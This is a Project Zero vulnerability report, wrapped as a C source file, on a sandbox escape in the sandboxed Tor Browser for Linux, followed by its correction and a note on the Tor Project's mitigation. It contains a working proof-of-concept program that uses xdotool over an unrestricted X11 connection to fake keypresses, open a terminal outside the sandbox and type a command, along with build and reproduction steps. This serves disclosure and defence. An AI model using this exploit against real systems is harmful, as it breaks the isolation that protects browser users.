@@ -1,0 +1,94 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1293&desc=2
+
+**EDIT: I mixed up two different sandboxes; see the comment below for a correction.**
+
+From inside the Linux sandbox described in
+<https://blog.torproject.org/blog/tor-browser-70-released>, it is
+still possible to talk to the X server without any restrictions.
+This means that a compromised browser can e.g. use the
+XTEST X protocol extension
+(<https://www.x.org/releases/X11R7.7/doc/xextproto/xtest.html>) to
+fake arbitrary keyboard and mouse events, directed at arbitrary
+windows. This permits a sandbox breakout, e.g. by injecting keypresses
+into a background window.
+
+<https://trac.torproject.org/projects/tor/wiki/doc/TorBrowser/Sandbox/Linux#HowdoIprotectmyselffromXexploits>
+mentions that the X server is reachable, but it sounds like the author
+didn't realize that a normal connection to the X server permits
+sandbox breakouts by design.
+
+To reproduce:
+
+Install Debian Jessie with the Xfce4 desktop environment and with
+backports enabled.
+Install bubblewrap and xdotool.
+Install the sandboxed Tor browser from
+<https://www.torproject.org/dist/torbrowser/7.0a4/sandbox-0.0.6-linux64.zip>.
+Launch the sandboxed Tor browser, use the default configuration. When
+the browser has launched, close it.
+Delete ~/.local/share/sandboxed-tor-browser/tor-browser/Browser/firefox.
+Store the following as ~/.local/share/sandboxed-tor-browser/tor-browser/Browser/firefox.c:
+
+=========================
+*/
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void){
+  int status;
+  setenv("LD_LIBRARY_PATH", "/home/amnesia/sandboxed-tor-browser/tor-browser", 1);
+  if (fork() == 0) {
+    execl("/home/amnesia/sandboxed-tor-browser/tor-browser/xdotool", "xdotool", "key", "alt+F2", "sleep", "1", "type", "xfce4-terminal", NULL);
+    perror("fail");
+    return 0;
+  }
+  wait(&status);
+  if (fork() == 0) {
+    execl("/home/amnesia/sandboxed-tor-browser/tor-browser/xdotool", "xdotool", "sleep", "1", "key", "Return", "sleep", "1", "type", "id", NULL);
+    perror("fail");
+    return 0;
+  }
+  wait(&status);
+  if (fork() == 0) {
+    execl("/home/amnesia/sandboxed-tor-browser/tor-browser/xdotool", "xdotool", "sleep", "1", "key", "Return", NULL);
+    perror("fail");
+    return 0;
+  }
+  wait(&status);
+  while (1) sleep(1000);
+  return 0;
+}
+
+/*
+=========================
+
+In ~/.local/share/sandboxed-tor-browser/tor-browser/Browser, run
+"gcc -static -o firefox firefox.c".
+Run "cp /usr/bin/xdotool /usr/lib/x86_64-linux-gnu/* ~/.local/share/sandboxed-tor-browser/tor-browser/".
+Now run the launcher for the sandboxed browser again. Inside the
+sandbox, the new firefox binary will connect to the X11 server and
+send fake keypresses to open a terminal outside the sandbox and type
+into it.
+
+There are probably similar issues with pulseaudio when it's enabled;
+I suspect that it's possible to e.g. use the pulseaudio socket to load
+pulseaudio modules with arbitrary parameters, which would e.g. permit
+leaking parts of files outside the sandbox by using them as
+authentication cookie files for modules that implement audio streaming
+over the network.
+
+
+###################################################################
+
+I mixed up two sandboxes.
+
+The blog post <https://blog.torproject.org/blog/tor-browser-70-released> talks about the Firefox content process sandbox, which is still in development and unrelated to the Tor-specific sandbox I looked at. So the "content sandboxing" the blog post talks about isn't very effective yet; the Mozilla wiki points to multiple bug lists that document the remaining work (https://wiki.mozilla.org/Security/Sandbox#Bug_Lists).
+
+The sandbox I looked at here is written and distributed by the Tor Project.
+
+
+https://gitweb.torproject.org/tor-browser/sandboxed-tor-browser.git/commit/?id=1bfbd7cc1cd60c9468f2e33a3d4816973f1fb2f5 was added to mitigate the issue I reported by filtering X11 traffic and whitelisting permitted X protocol extensions.
+
+More warnings have been added to the corresponding documentation (https://trac.torproject.org/projects/tor/wiki/doc/TorBrowser/Sandbox/Linux?action=diff&version=23&old_version=21) that point out that this sandbox should not be used without manually configuring nested X11 and that pulseaudio is unsafe.
+*/
